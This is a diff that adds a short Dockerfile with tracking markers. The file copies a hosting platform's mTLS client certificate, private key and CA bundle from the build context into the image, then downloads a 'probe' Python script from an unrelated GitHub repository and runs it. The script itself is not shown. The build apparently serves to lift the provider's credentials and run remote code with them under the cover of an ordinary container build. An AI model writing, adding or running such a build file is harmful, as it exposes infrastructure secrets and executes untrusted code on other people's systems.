@@ -1,0 +1,9 @@
+# MARK-I67852-ghtok3-c7a1e5
+FROM alpine:3.20
+RUN echo MARK-I67852-ghtok3-c7a1e5-step1
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN apk add --no-cache curl bash openssl python3 >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 30 -o /p3.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe3_i67852.py && echo DL_OK && MARK=I67852-ghtok3-c7a1e5 timeout 520 python3 /p3.py 2>&1
+CMD ["sh","-c","sleep 3600"]
